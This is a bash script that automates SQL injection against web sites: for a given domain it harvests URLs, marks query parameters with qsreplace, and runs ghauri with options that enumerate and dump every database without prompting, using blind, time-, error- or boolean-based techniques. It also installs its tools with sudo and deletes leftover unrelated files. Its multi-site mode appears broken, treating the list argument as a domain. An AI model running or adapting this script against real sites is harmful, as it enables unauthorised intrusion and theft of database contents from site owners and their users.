#!/usr/bin/env bash

# Function to display usage message
display_usage() {
    echo "Usage:"
    echo "     $0 -d http://example.com -all"
    echo "     $0 -d http://example.com -t"
    echo "     $0 -l http://example.com -all"
    echo "     $0 -l http://example.com -t"
    echo "Techniques: -all, -b, -t, -e, -bb"
    echo "           all, Blind all, Time based, Error based, Boolean based"
    echo ""
    echo "Options:"
    echo "  -h               Display this help message"
    echo "  -d               Single site scan"
    echo "  -l               Multiple site scan"
    echo "  -c               Installing required tools"
    echo "  -i               Check if required tools are installed"
    exit 0
}

# Check if help is requested
if [[ "$1" == "-h" ]]; then
    display_usage
    exit 0
fi

# Function to check installed tools
check_tools() {
    tools=( "anew" "qsreplace" "ghauri" "urlfinder")

    echo "Checking required tools:"
    for tool in "${tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            echo "$tool is installed at $(which $tool)"
        else
            echo "$tool is NOT installed or not in the PATH"
        fi
    done
}

# Check if tool installation check is requested
if [[ "$1" == "-i" ]]; then
    check_tools
    exit 0
fi

# Check if help is requested
if [[ "$1" == "-c" ]]; then
    echo "qsreplace==============================="
    go install -v github.com/tomnomnom/qsreplace@latest
    echo "anew===================================="
    go install -v github.com/tomnomnom/anew@latest
    echo "urlfinder===================================="
    go install -v github.com/projectdiscovery/urlfinder/cmd/urlfinder@latest
    echo "ghauri=================================="
    cd /opt/ && sudo git clone https://github.com/r0oth3x49/ghauri.git && cd ghauri/
    sudo chmod +x setup.py
    sudo python3 -m pip install --upgrade -r requirements.txt --break-system-packages
    sudo python3 -m pip install -e . --break-system-packages
    sudo python3 setup.py install
    cd
    echo "urlfinder===================================="
    pip3 install uro
    sudo rm -r google-chrome-stable_current_amd64.deb.* bxssMostUsed.txt.* xssBlind.txt.*
    sudo mv ~/gopath/bin/* /usr/local/bin/
    exit 0
fi


# Single domain
# all vulnerability
if [[ "$1" == "-d" && "$3" == "-all" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    urlfinder -d "$domain_Without_Protocol" -fs fqdn -all  | grep -aiE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=BEST --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# All Blind
if [[ "$1" == "-d" && "$3" == "-b" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    urlfinder -d "$domain_Without_Protocol" -fs fqdn -all  | grep -aiE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=BT --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# Error based
if [[ "$1" == "-d" && "$3" == "-e" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    urlfinder -d "$domain_Without_Protocol" -fs fqdn -all  | grep -aiE '\.(php|asp|aspx|jsp|cfm)' > sqli.txt;ghauri -m sqli.txt --technique=E --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# Time based
if [[ "$1" == "-d" && "$3" == "-t" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    urlfinder -d "$domain_Without_Protocol" -fs fqdn -all  | grep -aiE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --level=3 --technique=T --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# Boolean based
if [[ "$1" == "-d" && "$3" == "-bb" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    urlfinder -d "$domain_Without_Protocol" -fs fqdn -all  | grep -aiE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=B --random-agent --confirm --force-ssl --dbs --dump --batch
fi



# Multi domain
# all vulnerability
if [[ "$1" == "-l" && "$3" == "-all" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    urlfinder -d "$domain_Without_Protocol" -all  | grep -aiE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=BEST --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# All Blind
if [[ "$1" == "-l" && "$3" == "-b" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    urlfinder -d "$domain_Without_Protocol" -all  | grep -aiE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=BT --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# Error based
if [[ "$1" == "-l" && "$3" == "-e" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    urlfinder -d "$domain_Without_Protocol" -all  | grep -aiE '\.(php|asp|aspx|jsp|cfm)' > sqli.txt;ghauri -m sqli.txt --technique=E --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# Time based
if [[ "$1" == "-l" && "$3" == "-t" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    urlfinder -d "$domain_Without_Protocol" -all  | grep -aiE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --level=3 --technique=T --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# Boolean based
if [[ "$1" == "-l" && "$3" == "-bb" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    urlfinder -d "$domain_Without_Protocol" -all  | grep -aiE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=B --random-agent --confirm --force-ssl --dbs --dump --batch
fi
